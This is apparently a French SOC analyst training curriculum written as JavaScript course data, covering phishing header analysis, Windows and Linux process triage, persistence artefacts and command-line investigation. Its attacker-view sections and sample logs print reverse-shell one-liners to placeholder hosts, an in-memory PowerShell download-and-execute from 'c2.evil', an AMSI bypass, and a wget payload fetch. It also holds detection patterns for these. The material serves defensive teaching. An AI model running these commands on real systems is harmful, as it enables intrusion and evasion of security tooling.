              objectif: "Analyser les headers d'un email suspect et déterminer s'il est légitime ou spoofé",
              contexte: "Un utilisateur signale un email de sa 'Direction Générale' lui demandant de virer 45 000€ en urgence. L'email semble venir de dg@votre-entreprise.fr.",
              outils: ["MXToolbox Email Header Analyzer", "Google Admin Toolbox", "AbuseIPDB", "VirusTotal"],
              donnees: `Headers à analyser :
\`\`\`
Received: from mail.malicious-server.ru (185.220.x.x)
  by mx.votre-entreprise.fr; Mon, 15 Jan 2024 09:15:00 +0100
From: "Directeur Général" <dg@votre-entreprise.fr>
Reply-To: <virement.urgent@gmail.com>
Return-Path: <bounce@malicious-server.ru>
Subject: URGENT - Virement confidentiel
Authentication-Results: mx.votre-entreprise.fr;
  spf=fail (sender IP is 185.220.x.x);
  dkim=none;
  dmarc=fail (action=none)
\`\`\``,
              etapes: [
                "Copier les headers dans MXToolbox Email Header Analyzer",
                "Identifier le vrai serveur d'envoi (Received: from)",
                "Vérifier SPF, DKIM, DMARC dans Authentication-Results",
                "Comparer From vs Return-Path vs Reply-To",
                "Vérifier l'IP 185.220.x.x sur AbuseIPDB",
                "Conclusion : légitime ou spoofé ? Sévérité ?"
              ],
              livrable: "Fiche d'analyse : vrai expéditeur, SPF/DKIM/DMARC status, verdict, recommandation (bloquer le sender ? former l'utilisateur ?)",
              questions_correction: [
                "SPF=fail signifie que l'IP d'envoi n'est pas autorisée par le domaine. Conclusion ?",
                "Reply-To différent du From = redirection de réponse vers l'attaquant",
                "Même si DMARC=none (pas de rejet configuré), l'email est-il légitime ?"
              ]
            },

            cas_concret: `## Scénario : Campagne de phishing détectée

**10h30 — 3 tickets helpdesk** : "j'ai reçu un email bizarre de la RH"

**Investigation email gateway logs :**
\`\`\`
Sender: rh@notre-entreprise-rh.fr   ← domaine sosie (tiret ajouté)
Recipients: 47 adresses internes
Subject: [URGENT] Mise à jour RIB — Action requise avant 12h
Attachment: RIB_form_2024.exe     ← extension .exe déguisée
SPF: fail | DKIM: none | DMARC: fail
Sending IP: 185.220.101.88
\`\`\`

**Analyse de la pièce jointe :**
- SHA256 du fichier → VirusTotal : 45/72 AV détectent "AgentTesla Infostealer"
- Any.run sandbox : le fichier exécute cmd.exe, contacte 192.0.2.100:8080

**Impact :**
- 47 emails envoyés, 12 ouverts (logs email gateway)
- 3 pièces jointes téléchargées (logs proxy)
- 1 exécution confirmée (alerte EDR sur WKS-047)

**Actions :**
1. Bloquer le domaine sosie et l'IP sender sur le gateway email
2. Rappeler/supprimer les emails non ouverts (admin email)
3. Isoler WKS-047 en quarantaine réseau
4. Notifier les 12 utilisateurs qui ont ouvert → reset credentials
5. Ouvrir incident P2 dans TheHive
6. IOC : hash EXE + IP C2 → ajouter dans le SIEM pour détection future`,

            exercices: [
              { titre: "Analyser 5 requêtes DNS suspectes", desc: "Données fournies : 5 exemples de logs DNS avec domaines de longueur variable. Classer : DGA probable / tunneling / légitime. Justifier.", difficulte: "moyen", type: "analyse" },
              { titre: "Décortiquer les headers d'un vrai email", desc: "Dans Gmail : ouvrir un email → '...' → Afficher le message d'origine. Identifier Received-from, SPF, DKIM, DMARC. Vérifier sur MXToolbox.", difficulte: "facile", type: "lab", outil: "Gmail + MXToolbox" },
              { titre: "Détecter le beaconing dans des logs proxy", desc: "Donnée : 500 lignes de logs proxy. Chercher les IPs avec >20 connexions vers la même destination externe, peu d'URLs différentes. Isoler les candidats beaconing.", difficulte: "avancé", type: "analyse" }
            ],

            questions: [
              "Un email arrive avec SPF=fail et DMARC=none. Que faites-vous et pourquoi DMARC=none est problématique ?",
              "Comment distinguer du trafic DNS normal du DNS tunneling dans les logs ?",
              "Un poste contacte la même IP externe toutes les 5 minutes depuis 12h. Quelle est votre hypothèse principale ?",
              "Quels outils utilisez-vous pour analyser une URL suspecte sans cliquer dessus ?"
            ],

            niveau_recruteur: `## Attendu en entretien SOC L1

**Compétences exigées :**
- Analyser les headers d'un email et conclure sur le spoofing (SPF/DKIM/DMARC)
- Identifier un pattern de beaconing dans des logs proxy
- Savoir ce qu'est le DNS tunneling et comment le détecter
- Utiliser VirusTotal, AbuseIPDB, MXToolbox (outils gratuits quotidiens)

**Question classique :** "Un utilisateur reporte un email suspect. Que faites-vous ?"
Réponse structurée : headers → SPF/DKIM/DMARC → IP sender → pièce jointe/URL → verdict → action`,

            erreurs: [
              "Cliquer sur les liens ou ouvrir les pièces jointes d'un email suspect — toujours analyser en sandbox.",
              "Conclure 'c'est du phishing' uniquement parce que l'email semble bizarre — documenter les IOC techniques.",
              "Ignorer DMARC=none — ça veut dire que même avec SPF fail, les emails passent quand même.",
              "Bloquer l'expéditeur uniquement — chercher aussi si d'autres utilisateurs ont reçu le même email."
            ],
            resume: `DNS anormal : volume élevé + sous-domaines longs + entropie élevée. Beaconing : même IP externe, intervalles réguliers, peu d'URLs. Email spoofé : SPF fail + From ≠ Return-Path + DMARC fail. Toujours analyser avec des outils (VirusTotal, AbuseIPDB, MXToolbox) avant de conclure.`
          }
        },

        // ── M1C3 ──────────────────────────────────────────────
        {
          id: "m1c3",
          titre: "Systèmes d'exploitation — vision SOC",
          description: "Windows et Linux : processus normaux vs suspects, artefacts d'investigation, logs système.",
          duree: "1 semaine",
          difficulte: "débutant",
          prerequis: [],
          sous_competences: [
            "Structure Windows : processus, services, registre, arborescence",
            "Structure Linux : arborescence, permissions, services systemd",
            "Processus légitimes vs imposteurs (process masquerading)",
            "Windows Event Logs : IDs critiques SOC",
            "Linux logs : auth.log, syslog, cron",
            "Artefacts de persistance Windows et Linux"
          ],
          cours: {
            simple: `En SOC, tu ne regardes pas les OS pour les administrer — tu les regardes pour détecter ce qui ne devrait pas être là. La question permanente : **est-ce que ce processus / ce service / ce fichier est NORMAL ici ?**

---

## Windows — Ce que voit un analyste SOC

**Les processus légitimes à connaître par cœur :**

| Processus | Emplacement normale | Signe suspect |
|-----------|---------------------|---------------|
| svchost.exe | C:\\Windows\\System32 | Ailleurs = malware |
| lsass.exe | C:\\Windows\\System32 | Doublon ou dump mémoire = vol de hash |
| explorer.exe | C:\\Windows | Connexion réseau sortante = suspect |
| cmd.exe / powershell.exe | Lancé par Office/Word | Toujours suspect |
| wscript.exe / cscript.exe | Lancé depuis Downloads | Script malveillant |

**Ce que tu vois en logs (Event Logs Windows) :**
- **Event 4624** : connexion réussie → qui s'est connecté, depuis où, comment (type 3 = réseau, type 10 = remote)
- **Event 4625** : échec de connexion → brute force si répété
- **Event 4688** : création de processus → quel programme lancé par quel parent
- **Event 4698** : création de tâche planifiée → persistance malware

**Ton réflexe :** si une alerte concerne un poste Windows → ouvrir l'EDR (CrowdStrike/Defender), regarder l'arbre de processus. Un Word qui lance PowerShell qui lance cmd.exe → phishing réussi, investigation immédiate.

---

## Windows — Registre et persistance

**Ce que c'est :** Le registre Windows stocke la configuration du système et des applications. Les malwares l'utilisent pour survivre aux redémarrages.

**Clés de persistance à surveiller :**
- \`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\` → programme qui se lance au démarrage
- \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\` → même chose, pour l'utilisateur
- \`HKLM\\SYSTEM\\CurrentControlSet\\Services\` → services Windows (parfois utilisés pour persistance)

**Ce que tu vois en logs :**
- **Sysmon Event 13** : modification d'une clé Run → malware qui s'installe en persistance
- **Event 7045** : nouveau service créé → peut être un outil de persistence (Cobalt Strike, malware)

**Ton réflexe :** EDR ou Sysmon → chercher les modifications récentes des clés Run après l'heure estimée de compromission.

---

## Linux — Ce que voit un analyste SOC

**Les fichiers et dossiers clés :**

| Fichier/Dossier | Contenu | Ce que tu cherches |
|-----------------|---------|-------------------|
| /var/log/auth.log | Connexions SSH, sudo | Brute force, escalade de privilèges |
| /var/log/syslog | Activité système | Cron jobs suspects, services |
| /etc/passwd | Comptes utilisateurs | Nouveau compte créé par un attaquant |
| /etc/cron.d/ | Tâches planifiées | Persistance malware via cron |
| /tmp/ et /dev/shm/ | Fichiers temporaires | Malware stocké là (zones souvent exécutables) |
| ~/.bash_history | Historique commandes | Reconstitution des actions de l'attaquant |

**Ce que tu vois en logs :**
- \`sudo: pam_unix(sudo:auth): authentication failure\` → escalade de privilèges ratée
- \`CRON[12345]: (root) CMD (/tmp/backdoor.sh)\` → persistance via cron
- \`sshd[9876]: Accepted publickey for root\` depuis une IP inconnue → backdoor SSH

**Ton réflexe :** auth.log → timeline des connexions. \`last\` et \`lastb\` pour voir les connexions réussies et échouées. \`ps aux\` pour les processus actifs.

---

## La comparaison Windows / Linux en SOC

| Aspect | Windows | Linux |
|--------|---------|-------|
| Logs principaux | Event Viewer (EVTX) | /var/log/ (texte brut) |
| Persistance malware | Registre Run, Services, Scheduled Tasks | Cron, ~/.bashrc, /etc/init.d |
| Processus légitimes | svchost, lsass, explorer | systemd, sshd, cron |
| Outil d'investigation | EDR + Sysmon + PowerShell | Bash + grep + find |
| Vecteur d'attaque commun | Phishing Office, RDP | SSH brute force, web shells |

**Règle d'or SOC :** sur Windows, surveille les processus enfants. Sur Linux, surveille les connexions SSH et les cron jobs. Dans les deux cas, tout accès root/SYSTEM non planifié = alerte.`,

            technique: `## Processus Windows légitimes — ce qu'on doit savoir

| Processus | Parent normal | Chemin normal |
|-----------|--------------|---------------|
| System | None | N/A |
| smss.exe | System | %SystemRoot%\\System32 |
| csrss.exe | smss.exe | %SystemRoot%\\System32 |
| wininit.exe | smss.exe | %SystemRoot%\\System32 |
| lsass.exe | wininit.exe | %SystemRoot%\\System32 |
| services.exe | wininit.exe | %SystemRoot%\\System32 |
| svchost.exe | services.exe | %SystemRoot%\\System32 |
| explorer.exe | userinit.exe | %SystemRoot% |
| winlogon.exe | smss.exe | %SystemRoot%\\System32 |

**🚩 Red Flags immédiats :**
- svchost.exe sans parent services.exe
- lsass.exe lancé depuis explorer.exe
- Deux instances de lsass.exe
- svchost.exe dans C:\\Windows\\Temp ou %APPDATA%
- explorer.exe avec des connexions réseau sortantes

## Windows Event IDs critiques SOC

| ID | Événement | Sévérité SOC |
|----|-----------|-------------|
| 4624 | Connexion réussie | Info → corréler avec contexte |
| 4625 | Connexion échouée | Moyen → brute force si répété |
| 4648 | Connexion avec credentials explicites | Haut → RunAs suspect |
| 4688 | Nouveau processus créé | Critique → surveiller le parent |
| 4697 | Service installé | Critique → persistance malware |
| 4698 | Tâche planifiée créée | Critique → persistance |
| 4720 | Compte utilisateur créé | Haut → persistence |
| 4732 | Compte ajouté à un groupe | Critique si groupe Admin |
| 4768 | Ticket Kerberos demandé (TGT) | Info → surveiller AS-REP |
| 4769 | Ticket Kerberos service (TGS) | Haut si Kerberoasting |
| 4776 | Auth NTLM | Haut → Pass-the-Hash |
| 7045 | Nouveau service créé | Critique → persistance |

## Linux — Artefacts de persistance

\`\`\`bash
# Persistence classique
crontab -l              # Cron de l'utilisateur
cat /etc/crontab        # Cron système
ls /etc/cron.d/         # Cron supplémentaires
ls /etc/cron.daily/     # Scripts quotidiens

# Fichiers de démarrage
cat ~/.bashrc           # Exécuté à chaque shell interactif
cat ~/.bash_profile     # Exécuté à la connexion
cat /etc/rc.local       # Au démarrage (legacy)

# Services systemd
systemctl list-units --type=service --state=running
ls /etc/systemd/system/ # Services custom installés
\`\`\``,

            attaquant: `## Techniques de persistance et d'évasion

**Process Masquerading (Windows) :**
Renommer un malware en svchost.exe ou lsass.exe et le placer dans %TEMP%.
\`\`\`
C:\\Windows\\Temp\\svchost.exe   ← FAUX (chemin non standard)
C:\\Windows\\System32\\svchost.exe ← VRAI
\`\`\`

**Process Hollowing :**
Lancer un processus légitime (svchost.exe) en mode suspendu, remplacer son code en mémoire par du code malveillant, puis reprendre l'exécution. Le processus a l'air légitime mais exécute du code malveillant.

**Macro Word (T1204.002 MITRE) :**
\`\`\`
WINWORD.EXE → cmd.exe → powershell.exe -enc [base64]
\`\`\`
Word ne doit jamais lancer cmd.exe ou PowerShell. Alert immédiate.

**Persistance registre Windows :**
\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\SYSTEM\\CurrentControlSet\\Services   ← services malveillants
\`\`\`

**Persistance Linux — cron + reverse shell :**
\`\`\`bash
echo "* * * * * bash -i >& /dev/tcp/185.x.x.x/4444 0>&1" | crontab -
\`\`\``,

            soc: `## Investigation processus suspects

**Étape 1 — Lister les processus et leurs parents (Windows)**
\`\`\`powershell
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, ParentProcessId, CommandLine |
  Sort-Object ParentProcessId | Format-Table -AutoSize
\`\`\`

**Étape 2 — Chercher les connexions réseau par processus**
\`\`\`powershell
Get-NetTCPConnection -State Established |
  Select-Object LocalPort, RemoteAddress, RemotePort, OwningProcess |
  ForEach-Object { $_ | Add-Member -NotePropertyName ProcessName -NotePropertyValue (Get-Process -Id $_.OwningProcess).Name -PassThru }
\`\`\`

**Étape 3 — Vérifier la signature du binaire**
\`\`\`powershell
Get-AuthenticodeSignature "C:\\Windows\\Temp\\svchost.exe"
# Si Status = NotSigned ou HashMismatch → ALERTE
\`\`\`

**Étape 4 — Event 4688 avec Sysmon**
\`\`\`
EventID=4688
ParentProcessName: C:\\Program Files\\Microsoft Office\\WINWORD.EXE
NewProcessName: C:\\Windows\\System32\\cmd.exe
CommandLine: cmd.exe /c powershell -nop -w hidden -enc SGVsbG8=
\`\`\`
Word → cmd → PowerShell encodé = macro malveillante confirmée.`,

            logs_exemples: `## Windows Event Logs — Exemples réels

### Event 4688 — Chaîne de processus suspecte
\`\`\`xml
<Event>
  <EventID>4688</EventID>
  <TimeCreated>2024-01-15T10:23:45</TimeCreated>
  <Computer>WKS-042</Computer>
  <SubjectUserName>john.doe</SubjectUserName>
  <ParentProcessName>C:\\Program Files\\Microsoft Office\\WINWORD.EXE</ParentProcessName>
  <NewProcessName>C:\\Windows\\System32\\cmd.exe</NewProcessName>
  <CommandLine>cmd.exe /c powershell.exe -nop -w hidden -enc U0dWc2JHOD0=</CommandLine>
</Event>
\`\`\`
**Interprétation :** CRITIQUE. Word lance PowerShell encodé = macro malveillante.

### Event 4625 — Brute force
\`\`\`
TimeCreated: 2024-01-15 03:15:22 → 03:15:58 (36 secondes)
EventID: 4625 (x47 occurrences)
TargetUserName: administrator
IpAddress: 185.220.101.42
LogonType: 3 (Network)
FailureReason: Unknown user name or bad password
\`\`\`
**Interprétation :** Brute force réseau sur le compte Administrator depuis une IP externe.

### Auth.log Linux — Connexion post-brute force
\`\`\`
Jan 15 03:45:01 server sshd: Failed password for root from 185.220.101.42 (x200)
Jan 15 03:46:12 server sshd: Accepted password for deploy from 185.220.101.42
Jan 15 03:46:13 server sshd: pam_unix: session opened for user deploy
Jan 15 03:46:15 server sudo: deploy: TTY=pts/0 ; COMMAND=/bin/bash
Jan 15 03:46:16 server sudo: deploy: TTY=pts/0 ; COMMAND=/usr/bin/wget http://185.x.x.x/payload.sh
\`\`\`
**Interprétation :** Brute force réussi + escalade + téléchargement de payload. Compromission confirmée.`,

            atelier: {
              titre: "Atelier : Hunt de processus suspects sur un endpoint Windows",
              duree: "1h30",
              niveau: "intermédiaire",
              objectif: "Identifier des indicateurs de compromission dans les Event Logs Windows et les processus en cours",
              contexte: "Tu reçois une alerte EDR : 'Suspicious PowerShell execution on WKS-047'. Tu dois investiguer le endpoint pour confirmer ou infirmer une compromission.",
              outils: ["Windows Event Viewer ou Sysmon logs", "Process Explorer (Sysinternals)", "PowerShell"],
              etapes: [
                "Vérifier les Event 4688 des dernières 2h sur WKS-047 — chercher cmd.exe ou powershell.exe comme enfant d'un process Office",
                "Lister les connexions réseau établies : Get-NetTCPConnection | Where State -eq Established",
                "Croiser les PIDs des connexions suspectes avec Get-Process pour trouver le nom du processus",
                "Vérifier les clés de registre Run pour toute nouvelle entrée",
                "Regarder les tâches planifiées récentes : Get-ScheduledTask | Where State -ne Disabled",
                "Vérifier les services installés récemment (Event 7045 ou 4697)",
                "Compiler la timeline des événements"
              ],
              livrable: "Timeline d'investigation : T0 (premier signe suspect) → T-fin (dernière action connue). Liste des IOC trouvés. Verdict : compromis / non compromis. Action recommandée.",
              questions_correction: [
                "Si tu trouves PowerShell encodé en base64, comment le décoder rapidement ?",
                "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('base64ici'))",
                "Un processus svchost.exe avec parent explorer.exe — normal ou suspect ?"
              ]
            },

            cas_concret: `## Scénario : Macro malveillante dans un document Word

**Alerte Sysmon (Event 4688) :**
WINWORD.EXE → cmd.exe → powershell.exe -enc [base64]

**Décodage Base64 :**
\`\`\`powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("SQBFAF..."))
# Résultat :
IEX (New-Object Net.WebClient).DownloadString("http://185.x.x.x/stage2.ps1")
\`\`\`
Téléchargement et exécution d'un script distant = stager de malware.

**Event 4697 (15 min après) :**
Nouveau service installé : "WindowsUpdateSvc" → chemin : C:\\Users\\john\\AppData\\Local\\Temp\\svcupd.exe

**Actions :**
1. Isoler WKS-042 réseau (VLAN quarantaine)
2. Hash du fichier svcupd.exe → VirusTotal
3. Bloquer l'IP 185.x.x.x sur le firewall
4. Chercher le document Word source (email ? USB ?)
5. Vérifier si d'autres postes ont contacté la même IP (pivot SIEM)`,

            exercices: [
              { titre: "Mémoriser les Event IDs critiques", desc: "Flashcards : 4624/4625/4648/4688/4697/4698/4720/4732/7045. Pour chaque ID : événement, sévérité SOC, quand déclencher une alerte.", difficulte: "facile", type: "mémo" },
              { titre: "Arbre de processus — normal ou suspect ?", desc: "Données : 10 arbres de processus Windows (parent → enfant). Marquer chaque paire : NORMAL / SUSPECT / CRITIQUE. Justifier.", difficulte: "moyen", type: "analyse" },
              { titre: "Chercher la persistance sur un Linux", desc: "Sur une VM Linux : chercher tous les cron jobs, services systemd ajoutés, fichiers bashrc modifiés. Documenter ce que tu trouves.", difficulte: "moyen", type: "lab", outil: "VM Linux" }
            ],

            questions: [
              "Quel est le parent légitime de lsass.exe ? Si le parent est différent, que suspectez-vous ?",
              "Un utilisateur standard crée un service Windows (Event 7045). Pourquoi est-ce critique ?",
              "Comment différencier un vrai svchost.exe d'un imposteur sans regarder l'antivirus ?",
              "Word.exe lance PowerShell avec -EncodedCommand. C'est quoi le scénario d'attaque ?"
            ],

            niveau_recruteur: `## Attendu SOC L1

- Connaître les Event IDs critiques par cœur (4688, 4625, 7045 minimum)
- Savoir expliquer ce qu'est le process masquerading
- Identifier une chaîne de processus suspecte (Word → cmd → PowerShell)
- Savoir chercher la persistance Windows (Run registry, scheduled tasks, services)`,

            erreurs: [
              "Chercher uniquement les malwares connus — les LOLBins (Living off the Land) utilisent des outils légitimes.",
              "Ignorer l'arbre de processus — le parent est souvent plus révélateur que l'enfant.",
              "Faire confiance à l'antivirus uniquement — les malwares signés ou packagés passent souvent.",
              "Ne pas décoder le PowerShell base64 — c'est souvent là que se cache le payload réel."
            ],
            resume: `Processus suspects : mauvais parent, mauvais chemin, comportement réseau inhabituel. Event IDs critiques : 4688 (process), 4625 (login fail), 7045 (service). Word→cmd→PowerShell = macro malveillante. Persistance : Run registry + scheduled tasks + services.`
          }
        },

        // ── M1C4 ──────────────────────────────────────────────
        {
          id: "m1c4",
          titre: "Ligne de commande — Investigation terrain",
          description: "PowerShell et Bash pour investiguer rapidement un système suspect.",
          duree: "1 semaine",
          difficulte: "débutant",
          prerequis: ["m1c3"],
          sous_competences: [
            "PowerShell : investigation endpoint Windows",
            "Bash : investigation serveur Linux",
            "Recherche dans les logs (grep, awk, Select-String)",
            "Connexions réseau par processus (netstat, ss, Get-NetTCPConnection)",
            "Scripting basique : automatiser la collecte",
            "One-liners SOC indispensables"
          ],
          cours: {
            simple: `En SOC, la ligne de commande est ton scalpel. L'interface graphique est trop lente, pas reproductible, pas scriptable. Le CLI est précis, rapide, et chaque commande peut être documentée dans ton ticket. Un analyste qui maîtrise PowerShell et Bash peut investiguer n'importe quel endpoint en 5 minutes.

---

## PowerShell — Investigation Windows

**Pourquoi PowerShell ?** C'est l'outil natif Windows le plus puissant pour l'investigation. Les attaquants l'utilisent aussi — ce qui veut dire que les logs PowerShell sont une mine d'or.

**Commandes d'investigation essentielles :**

\`\`\`powershell
# Voir les connexions réseau actives et les processus associés
netstat -anob

# Lister les processus avec leur chemin complet
Get-Process | Select-Object Name, Id, Path, CPU | Sort-Object CPU -Descending

# Voir les tâches planifiées (recherche de persistance)
Get-ScheduledTask | Where-Object {\$_.State -eq "Ready"} | Select-Object TaskName, TaskPath

# Lister les services récemment créés
Get-WinEvent -LogName System | Where-Object {\$_.Id -eq 7045} | Select-Object TimeCreated, Message -First 20

# Chercher les clés de registre de persistance
Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Get-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Derniers fichiers modifiés (recherche de malware)
Get-ChildItem C:\\Users -Recurse -Force | Sort-Object LastWriteTime -Descending | Select-Object -First 30
\`\`\`

**Ce que tu cherches :**
- Un process avec un chemin dans \`C:\\Users\\Public\\\` ou \`C:\\Temp\\\` → suspect
- Une tâche planifiée qui exécute un script PowerShell → persistance probable
- Une connexion établie vers une IP externe depuis un process Office → compromission

---

## Bash — Investigation Linux

**Commandes d'investigation essentielles :**

\`\`\`bash
# Voir les connexions réseau actives
ss -tupn
netstat -tupn

# Processus en cours d'exécution avec hiérarchie
ps auxf

# Fichiers récemment modifiés (dernières 24h)
find / -mtime -1 -type f 2>/dev/null | grep -v proc

# Fichiers dans /tmp et /dev/shm (zones suspectes)
ls -la /tmp/ /dev/shm/

# Dernières connexions SSH
last -F | head -30
lastb | head -20   # Tentatives ratées

# Chercher les fichiers SUID (escalade de privilèges)
find / -perm -4000 -type f 2>/dev/null

# Cron jobs actifs (persistance)
crontab -l
cat /etc/cron.d/*
ls /var/spool/cron/crontabs/
\`\`\`

**Ce que tu cherches :**
- Un processus dans \`/tmp/\` ou \`/dev/shm/\` → malware se cache là
- Une connexion outbound depuis un process web (apache, nginx) → webshell
- Un cron job récent qui n'existait pas avant l'incident → persistance

---

## Grep — Recherche dans les logs

Le couteau suisse de l'analyste Linux pour fouiller les logs texte.

\`\`\`bash
# Chercher toutes les connexions SSH réussies depuis une IP suspecte
grep "Accepted" /var/log/auth.log | grep "185.220.101.42"

# Compter les échecs d'authentification par IP (brute force)
grep "Failed password" /var/log/auth.log | awk '{print \$11}' | sort | uniq -c | sort -rn | head -20

# Chercher des téléchargements suspects dans les logs Apache
grep "GET.*\\.php\\|GET.*\\.exe\\|POST.*\\.php" /var/log/apache2/access.log

# Timeline d'une IP suspecte dans tous les logs
grep "185.220.101.42" /var/log/*.log | sort -k1,2
\`\`\`

---

## Tableau de référence rapide

| Besoin | Windows (PowerShell) | Linux (Bash) |
|--------|---------------------|--------------|
| Connexions réseau | \`netstat -anob\` | \`ss -tupn\` |
| Processus actifs | \`Get-Process\` | \`ps auxf\` |
| Fichiers récents | \`Get-ChildItem -Recurse \| Sort LastWriteTime\` | \`find / -mtime -1\` |
| Persistance | Registre Run + Tâches planifiées | Cron + bashrc |
| Logs | Event Viewer / \`Get-WinEvent\` | \`/var/log/\` + \`grep\` |
| Utilisateurs connectés | \`query user\` | \`who\` / \`last\` |

**Règle SOC :** documente chaque commande que tu exécutes pendant une investigation. Ça fait partie des preuves et du rapport d'incident.`,

            technique: `## PowerShell — Investigation Windows (One-liners)

\`\`\`powershell
# Connexions réseau + processus associé
Get-NetTCPConnection -State Established | ForEach-Object {
  $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
  [PSCustomObject]@{
    LocalPort  = $_.LocalPort
    RemoteAddr = $_.RemoteAddress
    RemotePort = $_.RemotePort
    PID        = $_.OwningProcess
    Process    = $proc.Name
    Path       = $proc.Path
  }
} | Format-Table -AutoSize

# Event Logs — derniers logins échoués
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50 |
  Select-Object TimeCreated,
    @{N='User';E={$_.Properties[5].Value}},
    @{N='IP';E={$_.Properties[19].Value}}

# Processus avec leur ligne de commande complète
Get-WmiObject Win32_Process | Select-Object ProcessId, Name, CommandLine |
  Where-Object {$_.CommandLine -match "powershell|cmd|wscript|cscript|mshta"} |
  Format-List

# Tâches planifiées suspectes
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} |
  Select-Object TaskName, TaskPath, @{N='Action';E={$_.Actions.Execute}} |
  Where-Object {$_.Action -match "powershell|cmd|wscript|http|temp"}

# Clés de registre de persistance
Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
Get-ItemProperty "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
\`\`\`

## Bash — Investigation Linux (One-liners)

\`\`\`bash
# Connexions réseau actives avec process
ss -tulpn
netstat -tulpn 2>/dev/null || ss -tulpn

# Processus avec réseau + commande complète
lsof -i -n -P | grep ESTABLISHED

# Brute force SSH — top IPs
grep "Failed password" /var/log/auth.log | \\
  awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# Fichiers modifiés récemment (dernières 24h)
find / -mtime -1 -type f 2>/dev/null | grep -v "/proc" | grep -v "/sys"

# Fichiers SUID — vecteur d'escalade
find / -perm -4000 -type f 2>/dev/null

# Cron jobs de tous les utilisateurs
for user in $(cut -d: -f1 /etc/passwd); do
  crontab -l -u $user 2>/dev/null && echo "=== $user ==="
done

# Connexions entrantes suspectes (auth.log)
grep "Accepted" /var/log/auth.log | awk '{print $9, $11}' | sort | uniq -c | sort -rn
\`\`\``,

            attaquant: `**PowerShell offensif (Living-off-the-Land) :**
\`\`\`powershell
# Download + Execute en mémoire (sans écrire sur le disque)
IEX (New-Object Net.WebClient).DownloadString("http://c2.evil/payload.ps1")

# Contournement AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Reverse shell PowerShell
$client = New-Object System.Net.Sockets.TCPClient("185.x.x.x",4444)
\`\`\`

**Bash reverse shell :**
\`\`\`bash
bash -i >& /dev/tcp/185.x.x.x/4444 0>&1
python3 -c 'import socket,subprocess,os; ...'
\`\`\`

**Ces commandes dans les logs = alerte critique.**`,

            soc: `## Détecter PowerShell malveillant

**Indicateurs dans les Event Logs :**
- -EncodedCommand ou -enc → obfuscation (Event 4688)
- -NonInteractive -WindowStyle Hidden → discret
- DownloadString / DownloadFile / WebClient → téléchargement
- IEX (Invoke-Expression) → exécution de code à la volée
- Bypass (ExecutionPolicy Bypass) → contournement

**Règle SIEM (Splunk SPL) :**
\`\`\`
index=wineventlog EventCode=4688
| where CommandLine matches "(?i)(encodedcommand|downloadstring|iex|bypass|hidden)"
| stats count by Computer, SubjectUserName, CommandLine
| sort -count
\`\`\`

**Script de triage rapide Windows :**
\`\`\`powershell
# Snapshot rapide d'un endpoint suspect
Write-Host "=== CONNEXIONS RÉSEAU ===" -ForegroundColor Cyan
Get-NetTCPConnection -State Established | ForEach-Object {
  "$($_.RemoteAddress):$($_.RemotePort) [PID:$($_.OwningProcess)] $(
    (Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name)"
}

Write-Host "=== PROCESSUS SUSPECTS ===" -ForegroundColor Yellow
Get-WmiObject Win32_Process |
  Where-Object {$_.CommandLine -match "enc|hidden|bypass|downloadstring|iex"} |
  Select-Object Name, ProcessId, CommandLine

Write-Host "=== PERSISTENCE REGISTRY ===" -ForegroundColor Red
Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" |
  Select-Object * -ExcludeProperty PS*
\`\`\``,

            logs_exemples: `## One-liners d'analyse de logs terrain

### Extraire les IPs qui ont échoué + réussi la connexion SSH
\`\`\`bash
# IPs avec brute force réussi (failed PUIS accepted)
comm -12 \\
  <(grep "Failed password" /var/log/auth.log | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort -u) \\
  <(grep "Accepted password" /var/log/auth.log | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort -u)
\`\`\`

### Analyser un access log Apache pour détecter du scanning
\`\`\`bash
# Top IPs par volume de requêtes
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# Codes d'erreur 4xx par IP (tentatives d'accès non autorisé)
awk '$9 ~ /^4/ {print $1, $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# Requêtes avec payloads suspects
grep -E "(union|select|script|../../|cmd=|exec=)" /var/log/apache2/access.log | head -20
\`\`\`

### PowerShell — Synthèse rapide des logins Windows
\`\`\`powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=@(4624,4625)} -MaxEvents 1000 |
  Group-Object Id | ForEach-Object {
    "$($_.Name): $($_.Count) événements"
  }
\`\`\``,

            atelier: {
              titre: "Atelier : Investigation CLI d'un serveur Linux compromis",
              duree: "1h",
              niveau: "intermédiaire",
              objectif: "En 30 min de CLI uniquement, déterminer si un serveur Linux est compromis et collecter les preuves",
              contexte: "Alert : 'Outbound connection to known C2 IP from srv-web-01 (10.0.0.15)'. Tu as accès SSH au serveur. Lance l'investigation.",
              outils: ["SSH", "bash", "Terminal"],
              etapes: [
                "ss -tulpn → lister les connexions établies et les ports en écoute",
                "netstat -anp | grep ESTABLISHED → identifier les process avec connexions sortantes",
                "ps aux | grep -v grep → liste complète des processus",
                "ls -la /proc/[PID]/exe → résoudre le binaire du PID suspect",
                "lsof -p [PID] → fichiers ouverts par le processus suspect",
                "find /tmp /var/tmp /dev/shm -type f -newer /etc/passwd → fichiers récents dans les zones temp",
